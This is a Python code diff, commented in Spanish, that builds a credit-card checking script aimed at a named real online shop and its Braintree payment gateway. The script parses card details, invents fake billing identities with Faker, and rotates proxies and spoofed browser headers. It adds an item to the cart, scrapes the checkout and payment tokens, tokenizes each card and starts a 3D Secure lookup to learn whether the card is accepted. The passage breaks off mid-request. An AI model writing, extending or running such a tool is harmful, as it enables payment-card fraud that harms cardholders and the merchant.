@@ -76,7 +76,300 @@ def parse_card(card: str) -> Tuple[str, str, str, str]:
 
 def extract_braintree_token(html_content: str) -> Optional[str]:
     """Extrae el token de Braintree del HTML y lo decodifica"""
-    try    "browserScreenWidth": 1920,
+    try:
+        pattern = r'var wc_braintree_client_token = \["([^"]+)"\];'
+        match = re.search(pattern, html_content)
+        
+        if not match:
+            print("[ERROR] No se encontró el token de Braintree en el HTML")
+            return None
+        
+        encoded_token = match.group(1)
+        
+        try:
+            decoded_bytes = base64.b64decode(encoded_token)
+            decoded_token = decoded_bytes.decode('utf-8')
+            token_data = json.loads(decoded_token)
+            auth_fingerprint = token_data.get('authorizationFingerprint')
+            
+            if auth_fingerprint:
+                print(f"[INFO] Token de autorización extraído exitosamente")
+                return auth_fingerprint
+            else:
+                print("[ERROR] No se encontró authorizationFingerprint en el token decodificado")
+                return None
+                
+        except (base64.binascii.Error, json.JSONDecodeError, UnicodeDecodeError) as e:
+            print(f"[ERROR] Error al decodificar el token: {e}")
+            return None
+            
+    except Exception as e:
+        print(f"[ERROR] Error al extraer el token de Braintree: {e}")
+        return None
+
+async def test_proxy_connection(proxy_config: Dict[str, str]) -> bool:
+    """Prueba la conexión del proxy"""
+    try:
+        async with httpx.AsyncClient(
+            proxies=proxy_config,
+            timeout=30.0,
+            verify=False
+        ) as client:
+            resp = await client.get("https://httpbin.org/ip")
+            if resp.status_code == 200:
+                ip_data = resp.json()
+                print(f"[INFO] Proxy working - IP: {ip_data.get('origin', 'unknown')}")
+                return True
+            else:
+                print(f"[ERROR] Proxy test failed - Status: {resp.status_code}")
+                return False
+    except Exception as e:
+        print(f"[ERROR] Proxy test failed: {e}")
+        return False
+
+async def get_ip_address(proxy_config: Dict[str, str] = None) -> str:
+    try:
+        async with httpx.AsyncClient(
+            proxies=proxy_config if proxy_config else None,
+            timeout=30.0,
+            verify=False
+        ) as client:
+            resp = await client.get(
+                "https://api.ipify.org?format=json",
+                headers={
+                    "accept": "application/json",
+                    "user-agent": FakeUserAgent(os=["Windows"]).chrome,
+                }
+            )
+            if resp.status_code == 200:
+                ip = resp.json().get("ip", "")
+                print(f"[INFO] Current IP: {ip}")
+                return ip
+            else:
+                print(f"[ERROR] Failed to get IP address: {resp.status_code}")
+                return ""
+    except Exception as e:
+        print(f"[ERROR] Failed to get IP address: {e}")
+        return ""
+
+async def braintree_18_99_eur(card: str, use_proxy: bool = True) -> Optional[Tuple[str, str, str, str]]:
+    try:
+        card_number, exp_month, exp_year, cvv = parse_card(card)
+        
+        # Headers realistas
+        headers = {
+            "accept": "*/*",
+            "accept-encoding": "gzip, deflate, br",
+            "accept-language": "en-US,en;q=0.9",
+            "cache-control": "no-cache",
+            "pragma": "no-cache",
+            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        }
+        
+        # Datos fake US
+        fake_us = Faker(locale="en_US")
+        first_name = fake_us.first_name()
+        last_name = fake_us.last_name()
+        street_address = fake_us.street_address()
+        city = fake_us.city()
+        zip_code = fake_us.zipcode()
+        phone = fake_us.numerify("###-###-####")
+        email = fake_us.email()
+        
+        # Datos fake ES
+        fake_es = Faker(locale="es_ES")
+        first_name_es = fake_es.first_name()
+        last_name_es = fake_es.last_name()
+        street_address_es = fake_es.street_address()
+        city_es = "Barcelona"
+        zip_code_es = fake_es.numerify("08###")
+        
+        req_num = 0
+        session_id = str(uuid.uuid4())
+        reference_id = str(uuid.uuid4())
+        start_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        
+        # Sistema de proxys
+        proxy_config = None
+        if use_proxy:
+            proxy_config = proxy_rotator.get_next_proxy()
+            if proxy_config:
+                print(f"[INFO] Using proxy: {list(proxy_config.values())[0]}")
+                proxy_works = await test_proxy_connection(proxy_config)
+                if not proxy_works:
+                    proxy_rotator.mark_proxy_failed(proxy_config)
+                    proxy_config = None
+                    print("[WARNING] Proxy failed test, continuing without proxy")
+            else:
+                print("[WARNING] No proxy available, continuing without proxy")
+        
+        ip_address = await get_ip_address(proxy_config)
+        if not ip_address:
+            print("[ERROR] Could not retrieve IP address. Continuing anyway...")
+            ip_address = "127.0.0.1"  # Fallback IP
+        
+        # Configurar cliente HTTP
+        client_config = {
+            "timeout": 60.0,
+            "verify": False,
+            "follow_redirects": True
+        }
+        if proxy_config:
+            client_config["proxies"] = proxy_config
+        
+        async with httpx.AsyncClient(**client_config) as client:
+            # REQ 1: POST to admin-ajax.php
+            req_num = 1
+            print(f"[REQ {req_num}] Adding to cart...")
+            
+            resp = await client.post(
+                "https://nammanmuay.eu/wp-admin/admin-ajax.php",
+                headers={
+                    **headers,
+                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+                    "origin": "https://nammanmuay.eu",
+                    "referer": "https://nammanmuay.eu/namman-muay-cream-100g/",
+                    "x-requested-with": "XMLHttpRequest",
+                },
+                data={
+                    "quantity": "1",
+                    "add-to-cart": "623",
+                    "action": "ouwoo_ajax_add_to_cart",
+                    "variation_id": "0",
+                }
+            )
+            
+            if resp.status_code != 200:
+                if proxy_config:
+                    proxy_rotator.mark_proxy_failed(proxy_config)
+                print(f"[REQ {req_num} ERROR] Request failed with status code: {resp.status_code}")
+                return None
+            
+            print(f"[REQ {req_num}] Success - Added to cart")
+            
+            # REQ 2: GET to checkout
+            req_num = 2
+            print(f"[REQ {req_num}] Getting checkout page...")
+            
+            resp = await client.get(
+                "https://nammanmuay.eu/checkout/",
+                headers={
+                    **headers,
+                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+                    "referer": "https://nammanmuay.eu/namman-muay-cream-100g/",
+                    "upgrade-insecure-requests": "1",
+                }
+            )
+            
+            if resp.status_code != 200:
+                if proxy_config:
+                    proxy_rotator.mark_proxy_failed(proxy_config)
+                print(f"[REQ {req_num} ERROR] Request failed with status code: {resp.status_code}")
+                return None
+            
+            soup = BeautifulSoup(resp.text, "html.parser")
+            
+            # Extraer checkout nonce
+            input_tag = soup.find("input", id="woocommerce-process-checkout-nonce")
+            if input_tag and isinstance(input_tag, Tag):
+                checkout_nonce = input_tag.get("value")
+                print(f"[REQ {req_num}] Checkout nonce extracted")
+            else:
+                print(f"[REQ {req_num} ERROR] Error: 'checkout_nonce' not found.")
+                return None
+            
+            # Extraer y decodificar token de Braintree
+            auth_fingerprint = extract_braintree_token(resp.text)
+            if not auth_fingerprint:
+                print(f"[REQ {req_num} ERROR] Could not extract Braintree authorization fingerprint")
+                return None
+            
+            print(f"[INFO] Using authorization fingerprint: {auth_fingerprint[:50]}...")
+            
+            # REQ 3: POST to graphql
+            req_num = 3
+            print(f"[REQ {req_num}] Tokenizing credit card...")
+            
+            resp = await client.post(
+                "https://payments.braintree-api.com/graphql",
+                headers={
+                    **headers,
+                    "authorization": f"Bearer {auth_fingerprint}",
+                    "braintree-version": "2018-05-10",
+                    "content-type": "application/json",
+                    "origin": "https://assets.braintreegateway.com",
+                    "referer": "https://assets.braintreegateway.com/",
+                },
+                json={
+                    "clientSdkMetadata": {
+                        "source": "client",
+                        "integration": "custom",
+                        "sessionId": session_id,
+                    },
+                    "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }",
+                    "variables": {
+                        "input": {
+                            "creditCard": {
+                                "number": card_number,
+                                "expirationMonth": exp_month.zfill(2),
+                                "expirationYear": (
+                                    "20" + exp_year if len(exp_year) == 2 else exp_year
+                                ),
+                                "cvv": cvv,
+                                "billingAddress": {
+                                    "postalCode": zip_code,
+                                    "streetAddress": street_address,
+                                },
+                            },
+                            "options": {"validate": False},
+                        }
+                    },
+                    "operationName": "TokenizeCreditCard",
+                }
+            )
+            
+            if resp.status_code != 200:
+                if proxy_config:
+                    proxy_rotator.mark_proxy_failed(proxy_config)
+                print(f"[REQ {req_num} ERROR] Request failed with status code: {resp.status_code}")
+                print(f"[REQ {req_num} ERROR] Response: {resp.text[:200]}")
+                return None
+            
+            resp_json = resp.json()
+            
+            # Verificar si hay errores en la respuesta
+            if 'errors' in resp_json:
+                error_msg = resp_json['errors'][0].get('message', 'Unknown GraphQL error')
+                print(f"[REQ {req_num} ERROR] GraphQL Error: {error_msg}")
+                return "declined", error_msg, "unknown", "unknown"
+            
+            token = resp_json.get("data", {}).get("tokenizeCreditCard", {}).get("token")
+            if not token:
+                print(f"[REQ {req_num} ERROR] No token received from Braintree")
+                return None
+            
+            print(f"[REQ {req_num}] Success - Token received: {token[:20]}...")
+            
+            # REQ 4: POST to 3D Secure lookup
+            req_num = 4
+            print(f"[REQ {req_num}] 3D Secure lookup...")
+            
+            resp = await client.post(
+                f"https://api.braintreegateway.com/merchants/vb72b9cm2v6gskzz/client_api/v1/payment_methods/{token}/three_d_secure/lookup",
+                headers={
+                    **headers,
+                    "content-type": "application/json",
+                    "origin": "https://nammanmuay.eu",
+                    "referer": "https://nammanmuay.eu/",
+                },
+                json={
+                    "amount": "18.99",
+                    "browserColorDepth": 24,
+                    "browserJavaEnabled": False,
+                    "browserJavascriptEnabled": True,
+                    "browserLanguage": "en-US",
+                    "browserScreenHeight": 1080,
+                    "browserScreenWidth": 1920,
                     "browserTimeZone": 240,
                     "deviceChannel": "Browser",
                     "additionalInfo": {
